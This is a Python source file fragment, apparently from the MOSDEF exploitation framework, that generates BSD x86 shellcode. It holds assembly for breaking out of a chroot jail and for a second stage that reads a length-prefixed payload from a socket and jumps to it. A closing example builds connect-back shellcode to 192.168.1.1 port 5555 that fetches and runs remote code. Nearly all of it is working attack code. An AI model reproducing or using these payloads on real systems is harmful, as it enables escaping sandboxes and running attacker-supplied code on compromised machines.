    def chroot(self, args):
        """
        Lame break chroot shell
        TODO:
            - Need optimization (probably change the whole shellcode, cause i suck)
        """

        code="""
        xorl    %eax,%eax              
        pushl   %eax                   
        pushl   $0x2e2e6262            
        movl    %esp,%ebx              
        incl    %ebx                   
        xorl    %ecx,%ecx              
        movb    $0x27,%al              
        int     $0x80                  
        xorl    %eax,%eax              
        movb    $0x3d,%al              
        int     $0x80                  
        incl    %ebx                   
        movb    $0xff,%cl
aqui:
        xorl    %eax, %eax
        movb    $0x0c,%al              
        int     $0x80                  
        loop    aqui        
        incl    %ebx                   
        movb    $0x3d,%al              
        int     $0x80                  
        """
        bin=mosdef.assemble(code,"X86")
        self.value+=bin
        
    def read_and_exec(self,args):
        """
        Reads in a little endian word of data, then reads in that much shellcode
        then jumps to it

        requires the register that has the socket handle in it to be args["fdreg"]
        
        """
        code="""
        readexec:
            """
        if args!=None and args["fdreg"]!="ebx":
            code+="""
            mov %FDREG,%ebx
            """
            code=code.replace("FDREG",args["fdreg"])
            
        code+="""
        // %ebx has our fd 
  movl $4,%ecx //size to read

  subl %ecx,%esp //get some space
  movl %esp, %edi //destination buffer
  movl %edi, %esi //save this off
  readloop1:
  push %ecx //size to read
  push %edi 
  push %ebx
  movl $3, %eax //sys_read
  push %eax //dummy argument for BSD fun
  int $0x80
  jb exitshellcode
  subl %eax, %ecx
  addl %eax, %edi //add readcnt to our buffer pointer
  cmp $0, %ecx //compensate for the loop -1
  jg readloop1
  //ok, now we've read into our buffer at %esp


  movl (%esi),%ecx //this is our size 
  subl %ecx,%esp //new buffer at %esp
  
  movl %esp, %edi //destination buffer
  movl %edi, %esi //save this off
  readloop2:
  push %ecx //size to read
  push %edi 
  push %ebx
  movl $3, %eax //sys_read
  push %eax //dummy argument for BSD fun
  int $0x80
  jb exitshellcode
  subl %eax, %ecx
  addl %eax, %edi //add readcnt to our buffer pointer
  cmp $0, %ecx
  jg readloop2
  //ok, now we've read into our buffer at %esp
  //ebx is our socket...
  jmp *%esi //Go to our new shellcode!
        
        """

        self.code+=code
        #print "Code=%s"%code

        return
    
    def read_and_exec_loop(self,args):
        """
        Reads in a little endian word of data, then reads in that much shellcode
        then CALLS it
        
        Shellcode needs to call "ret" when it is done

        requires the FD of the socket handle in it to be args["fd"]
        
        This is basically the core of MOSDEF!
        """
        code="""
        movl %esp, %ebp
        read_and_exec_loop:
        // %ebx has our fd 
        movl $FD,%ebx
  movl $4,%ecx //size to read

  subl %ecx,%esp //get some space
  movl %esp, %edi //destination buffer
  movl %edi, %esi //save this off
  readloop1:
  push %ecx //size to read
  push %edi 
  push %ebx
  movl $3, %eax //sys_read
  push %eax //dummy argument for BSD fun
  int $0x80
  add $12,%esp
  jb exitshellcode
  subl %eax, %ecx
  addl %eax, %edi //add readcnt to our buffer pointer
  cmp $0, %ecx //compensate for the loop -1
  jg readloop1
  //ok, now we've read into our buffer at %esp


  movl (%esi),%ecx //this is our size 
  subl %ecx,%esp //new buffer at %esp
  
  movl %esp, %edi //destination buffer
  movl %edi, %esi //save this off
  readloop2:
  push %ecx //size to read
  push %edi 
  push %ebx
  movl $3, %eax //sys_read
  push %eax //dummy argument for BSD fun
  int $0x80
  add $12,%esp
  jb exitshellcode
  subl %eax, %ecx
  addl %eax, %edi //add readcnt to our buffer pointer
  cmp $0, %ecx
  jg readloop2
  //ok, now we've read into our buffer at %esp
  //ebx is our socket...
  call *%esi //Go to our new shellcode!
  movl %ebp, %esp
  jmp read_and_exec_loop
        """
        code=code.replace("FD",str(args["fd"]))
        self.code+=code
        return

    
if __name__=="__main__":
    sc=bsd_X86()
    localhost="192.168.1.1"
    localport=5555
    sc.addAttr("connect",{"ipaddress": localhost, "port": localport})
    sc.addAttr("read_and_exec",None)
    sc.addAttr("exit",None)
    shellcode=sc.get()            
    print "Len shellcode=%d"%len(shellcode)

